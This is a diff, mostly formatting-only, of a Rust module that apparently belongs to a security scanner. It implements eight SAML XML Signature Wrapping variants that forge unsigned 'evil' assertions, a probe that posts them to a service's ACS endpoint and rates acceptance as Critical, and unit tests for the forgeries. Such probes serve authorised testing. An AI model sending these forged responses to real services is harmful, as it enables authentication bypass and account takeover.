@@ -4,7 +4,7 @@
 //! in a chain; each one attempts its XSW variant, then delegates to the next.
 //! All XML manipulation is string-based — no external XML crate required.
 
-use anyhow::{anyhow, Result};
+use anyhow::{Result, anyhow};
 use std::fmt;
 use thiserror::Error;
 
@@ -36,23 +36,23 @@ fn find_element<'a>(xml: &'a str, tag_name: &str) -> Option<(usize, usize, &'a s
         format!(":{tag_name} "),
         format!(":{tag_name}>"),
     ];
-    let start = open_candidates.iter().find_map(|pat| xml.find(pat.as_str()))?;
+    let start = open_candidates
+        .iter()
+        .find_map(|pat| xml.find(pat.as_str()))?;
 
     // Find the matching closing tag.  We look for </…Tag> regardless of prefix.
     let close_pat_bare = format!("</{tag_name}>");
     // Also match namespaced close tags.
     let end_search = &xml[start..];
     // Try bare close first, then scan for :</tag_name>
-    let close_rel = end_search
-        .find(&close_pat_bare)
-        .or_else(|| {
-            let colon_close = format!(":{tag_name}>");
-            end_search.find(&colon_close).map(|i| {
-                // Back up past the "</prefix:" part.
-                let before = &end_search[..i];
-                before.rfind('<').unwrap_or(i)
-            })
-        })?;
+    let close_rel = end_search.find(&close_pat_bare).or_else(|| {
+        let colon_close = format!(":{tag_name}>");
+        end_search.find(&colon_close).map(|i| {
+            // Back up past the "</prefix:" part.
+            let before = &end_search[..i];
+            before.rfind('<').unwrap_or(i)
+        })
+    })?;
 
     // The close_rel is relative to `start`; the end is after the close tag.
     let close_abs = start + close_rel;
@@ -108,7 +108,9 @@ pub struct Xsw1Handler {
 }
 
 impl XswHandler for Xsw1Handler {
-    fn name(&self) -> &'static str { "XSW1" }
+    fn name(&self) -> &'static str {
+        "XSW1"
+    }
 
     fn apply(&self, saml_xml: &str) -> Result<String> {
         let (sig_start, sig_end, sig_block) = extract_signature(saml_xml)
@@ -119,7 +121,9 @@ impl XswHandler for Xsw1Handler {
         let without_sig = remove_range(saml_xml, sig_start, sig_end);
 
         // Find the root element close (first '>') and insert Signature right after.
-        let root_close = without_sig.find('>').ok_or_else(|| anyhow!("no root element"))?;
+        let root_close = without_sig
+            .find('>')
+            .ok_or_else(|| anyhow!("no root element"))?;
         let with_sig_at_root = insert_before(&without_sig, root_close + 1, &sig_block);
 
         // Append an evil unsigned Assertion copy before </Response> (or at end).
@@ -147,7 +151,9 @@ pub struct Xsw2Handler {
 }
 
 impl XswHandler for Xsw2Handler {
-    fn name(&self) -> &'static str { "XSW2" }
+    fn name(&self) -> &'static str {
+        "XSW2"
+    }
 
     fn apply(&self, saml_xml: &str) -> Result<String> {
         let (sig_start, sig_end, sig_block) = extract_signature(saml_xml)
@@ -168,7 +174,9 @@ impl XswHandler for Xsw2Handler {
         Ok(result)
     }
 
-    fn next(&self) -> Option<&dyn XswHandler> { self.next.as_deref() }
+    fn next(&self) -> Option<&dyn XswHandler> {
+        self.next.as_deref()
+    }
 }
 
 // ──────────────────────────────────────────────────────────────────────────────
@@ -183,7 +191,9 @@ pub struct Xsw3Handler {
 }
 
 impl XswHandler for Xsw3Handler {
-    fn name(&self) -> &'static str { "XSW3" }
+    fn name(&self) -> &'static str {
+        "XSW3"
+    }
 
     fn apply(&self, saml_xml: &str) -> Result<String> {
         let (_, ass_end, ass_block) = extract_assertion(saml_xml)
@@ -198,7 +208,9 @@ impl XswHandler for Xsw3Handler {
         Ok(insert_before(saml_xml, ass_end, &evil_no_sig))
     }
 
-    fn next(&self) -> Option<&dyn XswHandler> { self.next.as_deref() }
+    fn next(&self) -> Option<&dyn XswHandler> {
+        self.next.as_deref()
+    }
 }
 
 // ──────────────────────────────────────────────────────────────────────────────
@@ -211,7 +223,9 @@ pub struct Xsw4Handler {
 }
 
 impl XswHandler for Xsw4Handler {
-    fn name(&self) -> &'static str { "XSW4" }
+    fn name(&self) -> &'static str {
+        "XSW4"
+    }
 
     fn apply(&self, saml_xml: &str) -> Result<String> {
         let (ass_start, ass_end, ass_block) = extract_assertion(saml_xml)
@@ -222,11 +236,18 @@ impl XswHandler for Xsw4Handler {
              <saml:Issuer>evil</saml:Issuer>{}</saml:Assertion>",
             ass_block
         );
-        let result = format!("{}{}{}", &saml_xml[..ass_start], wrapped, &saml_xml[ass_end..]);
+        let result = format!(
+            "{}{}{}",
+            &saml_xml[..ass_start],
+            wrapped,
+            &saml_xml[ass_end..]
+        );
         Ok(result)
     }
 
-    fn next(&self) -> Option<&dyn XswHandler> { self.next.as_deref() }
+    fn next(&self) -> Option<&dyn XswHandler> {
+        self.next.as_deref()
+    }
 }
 
 // ──────────────────────────────────────────────────────────────────────────────
@@ -239,7 +260,9 @@ pub struct Xsw5Handler {
 }
 
 impl XswHandler for Xsw5Handler {
-    fn name(&self) -> &'static str { "XSW5" }
+    fn name(&self) -> &'static str {
+        "XSW5"
+    }
 
     fn apply(&self, saml_xml: &str) -> Result<String> {
         // Place an evil unsigned assertion right before the Signature block.
@@ -253,7 +276,9 @@ impl XswHandler for Xsw5Handler {
         Ok(insert_before(saml_xml, sig_start, evil))
     }
 
-    fn next(&self) -> Option<&dyn XswHandler> { self.next.as_deref() }
+    fn next(&self) -> Option<&dyn XswHandler> {
+        self.next.as_deref()
+    }
 }
 
 // ──────────────────────────────────────────────────────────────────────────────
@@ -266,7 +291,9 @@ pub struct Xsw6Handler {
 }
 
 impl XswHandler for Xsw6Handler {
-    fn name(&self) -> &'static str { "XSW6" }
+    fn name(&self) -> &'static str {
+        "XSW6"
+    }
 
     fn apply(&self, saml_xml: &str) -> Result<String> {
         // Inject evil Assertion into an Extensions block inserted at root level.
@@ -280,7 +307,9 @@ impl XswHandler for Xsw6Handler {
         Ok(insert_before(saml_xml, root_close + 1, evil_ext))
     }
 
-    fn next(&self) -> Option<&dyn XswHandler> { self.next.as_deref() }
+    fn next(&self) -> Option<&dyn XswHandler> {
+        self.next.as_deref()
+    }
 }
 
 // ──────────────────────────────────────────────────────────────────────────────
@@ -293,7 +322,9 @@ pub struct Xsw7Handler {
 }
 
 impl XswHandler for Xsw7Handler {
-    fn name(&self) -> &'static str { "XSW7" }
+    fn name(&self) -> &'static str {
+        "XSW7"
+    }
 
     fn apply(&self, saml_xml: &str) -> Result<String> {
         // Insert evil Assertion inside ds:KeyInfo (if present), else prepend.
@@ -308,7 +339,9 @@ impl XswHandler for Xsw7Handler {
         Ok(insert_before(saml_xml, insert_pos, evil))
     }
 
-    fn next(&self) -> Option<&dyn XswHandler> { self.next.as_deref() }
+    fn next(&self) -> Option<&dyn XswHandler> {
+        self.next.as_deref()
+    }
 }
 
 // ──────────────────────────────────────────────────────────────────────────────
@@ -321,7 +354,9 @@ pub struct Xsw8Handler {
 }
 
 impl XswHandler for Xsw8Handler {
-    fn name(&self) -> &'static str { "XSW8" }
+    fn name(&self) -> &'static str {
+        "XSW8"
+    }
 
     fn apply(&self, saml_xml: &str) -> Result<String> {
         // Inject a ds:Object element containing an evil Assertion into the Signature.
@@ -336,7 +371,9 @@ impl XswHandler for Xsw8Handler {
         Ok(insert_before(saml_xml, sig_close, evil_obj))
     }
 
-    fn next(&self) -> Option<&dyn XswHandler> { self.next.as_deref() }
+    fn next(&self) -> Option<&dyn XswHandler> {
+        self.next.as_deref()
+    }
 }
 
 // ──────────────────────────────────────────────────────────────────────────────
@@ -412,7 +449,10 @@ impl SamlXswProbe {
                 }
             };
 
-            let (status, body) = client.post_saml(acs_url, &forged).await.unwrap_or((0, String::new()));
+            let (status, body) = client
+                .post_saml(acs_url, &forged)
+                .await
+                .unwrap_or((0, String::new()));
             let accepted = status == 200 || status == 302;
 
             // Heuristic: look for the evil NameID in the response body.
@@ -426,7 +466,11 @@ impl SamlXswProbe {
                 xsw_variant: handler.name().to_owned(),
                 accepted,
                 injected_attributes: injected,
-                severity: if accepted { Severity::Critical } else { Severity::Low },
+                severity: if accepted {
+                    Severity::Critical
+                } else {
+                    Severity::Low
+                },
             });
 
             current = handler.next();
@@ -461,37 +505,54 @@ mod tests {
     fn xsw1_produces_evil_assertion() {
         let handler = Xsw1Handler { next: None };
         let result = handler.apply(minimal_saml()).unwrap();
-        assert!(result.contains("evil_assert1") || result.contains("ID=\"evil_"),
-                "XSW1 should inject an evil assertion");
+        assert!(
+            result.contains("evil_assert1") || result.contains("ID=\"evil_"),
+            "XSW1 should inject an evil assertion"
+        );
     }
 
     #[test]
     fn xsw2_produces_evil_assertion() {
         let handler = Xsw2Handler { next: None };
         let result = handler.apply(minimal_saml()).unwrap();
-        assert!(result.contains("evil_"), "XSW2 should inject evil assertion");
+        assert!(
+            result.contains("evil_"),
+            "XSW2 should inject evil assertion"
+        );
     }
 
     #[test]
     fn xsw3_appends_evil_copy() {
         let handler = Xsw3Handler { next: None };
         let result = handler.apply(minimal_saml()).unwrap();
-        assert!(result.contains("evil_xsw3_"), "XSW3 should inject evil assertion copy");
+        assert!(
+            result.contains("evil_xsw3_"),
+            "XSW3 should inject evil assertion copy"
+        );
     }
 
     #[test]
     fn xsw4_wraps_legitimate() {
         let handler = Xsw4Handler { next: None };
         let result = handler.apply(minimal_saml()).unwrap();
-        assert!(result.contains("evil_xsw4"), "XSW4 should wrap with evil assertion");
+        assert!(
+            result.contains("evil_xsw4"),
+            "XSW4 should wrap with evil assertion"
+        );
     }
 
     #[test]
     fn xsw8_injects_into_signature() {
         let handler = Xsw8Handler { next: None };
         let result = handler.apply(minimal_saml()).unwrap();
-        assert!(result.contains("evil_xsw8"), "XSW8 should inject into Signature");
-        assert!(result.contains("ds:Object"), "XSW8 should use ds:Object wrapper");
+        assert!(
+            result.contains("evil_xsw8"),
+            "XSW8 should inject into Signature"
+        );
+        assert!(
+            result.contains("ds:Object"),
+            "XSW8 should use ds:Object wrapper"
+        );
     }
 
     #[test]
